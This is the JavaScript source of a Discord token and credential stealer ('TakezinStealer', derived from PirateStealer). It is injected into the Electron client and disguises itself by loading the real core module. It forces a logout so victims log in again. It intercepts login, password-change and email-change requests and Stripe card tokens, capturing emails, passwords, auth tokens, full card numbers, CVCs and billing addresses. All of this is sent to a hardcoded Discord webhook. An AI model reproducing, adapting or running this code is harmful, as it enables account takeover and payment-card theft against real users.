const fs = require('fs');
const path = require('path');
const { BrowserWindow, session } = require('electron')
const https = require("https");
const querystring = require('querystring');
var webhook = "https://canary.discord.com/api/webhooks/842952525523058699/DvDniybibHE5gQDMVMsJNLf6aq6S6FEC3Q0HT1xkimyii8JDeaGZpaH-MXo3ls-9ORC3"

webhook = webhook.replace("https://discord.com", "").replace("https://canary.discord.com", "").replace("https://ptb.discord.com", "").replace("https://discordapp.com", "")

function FirstTime(){
    
    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
        return true;
    }
    
    fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
    const window = BrowserWindow.getFocusedWindow();
    window.webContents.executeJavaScript(`function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()`, true).then((result) => {

    });
    return false;
}
const Filter = {
    "urls":[ "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
    "https://*.discord.com/api/v*/applications/detectable",
    "https://discord.com/api/v*/applications/detectable",
    "https://*.discord.com/api/v*/users/@me/library",
    "https://discord.com/api/v*/users/@me/library",
    "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
    "https://discord.com/api/v*/users/@me/billing/subscriptions"
    ]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
        if (FirstTime())
    callback({cancel:false})
})


function SendToWebhook(what) {

    const options = {
        hostname: 'discord.com',
        port: 443,
        path: webhook,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': what.length
        }
    }





    const req = https.request(options, res => {

        res.on('data', d => {
            process.stdout.write(d)
        })
    })

    req.on('error', error => {
        console.error(error)
    })

    req.write(what)
    req.end()

}






function Login(email, password, token) {
    var params = {
        username: "TakezinStealer",
        content: "",
        embeds: [
            {
                "title": "User Login",
                "description": "**Email: **```" + email + "```" + "\n**Password: **```" + password + "```" + "\n**Token:**```" + token + "```",
                "author": {
                    "name": "TakezinStealer"
                },
                "footer": {
                    "text": "https://github.com/Stanley-GF/PirateStealer"
                }
            }
        ]
    }
    SendToWebhook(JSON.stringify(params));
}


function ChangePassword(oldpassword, newpassword, token) {
    var params = {
        username: "TakezinStealer",
        content: "",
        embeds: [
            {
                "title": "User Change Password",
                "description": "**Old Password: **```" + oldpassword + "```" + "\n**New Password: **```" + newpassword + "```" + "\n**New Token:**```" + token + "```",
                "author": {
                    "name": "TakezinStealer"
                },
                "footer": {
                    "text": "https://github.com/Stanley-GF/PirateStealer"
                }
            }
        ]
    }
    SendToWebhook(JSON.stringify(params));

}

function ChangeEmail(newemail, password, token) {
    var params = {
        username: "TakezinStealer",
        content: "",
        embeds: [
            {
                "title": "User Change Email",
                "description": "**New Email: **```" + newemail + "```" + "\n**Password: **```" + password + "```" + "\n**New Token:**```" + token + "```",
                "author": {
                    "name": "TakezinStealer"
                },
                "footer": {
                    "text": "https://github.com/Stanley-GF/PirateStealer"
                }
            }
        ]
    }

    SendToWebhook(JSON.stringify(params));

}


function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    var params = {
        username: "TakezinStealer",
        content: "",
        embeds: [
            {
                "title": "User Credit Card Added",
                "description": "**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "**Token:**```" + token + "```",
                "author": {
                    "name": "TakezinStealer"
                },
                "footer": {
                    "text": "https://github.com/Stanley-GF/PirateStealer"
                }
            }
        ]
    }
    SendToWebhook(JSON.stringify(params));

}

const ChangePasswordFilter = {
    urls: [
        "https://discord.com/api/v*/users/@me",
        "https://*.discord.com/api/v*/users/@me",
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        "https://api.stripe.com/v*/tokens"

    ]
};

session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;

            const window = BrowserWindow.getFocusedWindow();
            window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
                Login(email, password, token);
            }));
        } else {


        }
    }
    if (details.url.endsWith("users/@me")) {

        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {

                    const window = BrowserWindow.getFocusedWindow();
                    window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
                        ChangePassword(data.password, data.new_password, token);
                    }));
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
                        ChangeEmail(data.email, data.password, token);
                    }));
                }
            }
        } else {


        }
    }
    if (details.url.endsWith("tokens")) {

        const window = BrowserWindow.getFocusedWindow();
        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
        window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token);
        }));
    }

});

module.exports = require('./core.asar')
